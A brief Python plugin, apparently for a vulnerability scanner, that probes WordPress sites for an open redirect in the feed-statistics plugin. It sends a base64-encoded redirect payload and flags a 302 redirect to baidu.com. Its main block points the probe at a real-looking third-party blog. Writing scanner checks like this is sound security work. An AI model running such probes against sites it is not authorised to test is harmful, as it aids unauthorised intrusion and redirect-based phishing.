#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Urahara'
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-content/plugins/wordpress-feed-statistics/feed-statistics.php?url=aHR0cHM6Ly93d3cuYmFpZHUuY29t'
    verify_url = arg + payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 302:
        m = re.search("www.baidu.com", head)
        if m:
            security_note(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.publishblog.de/')[1])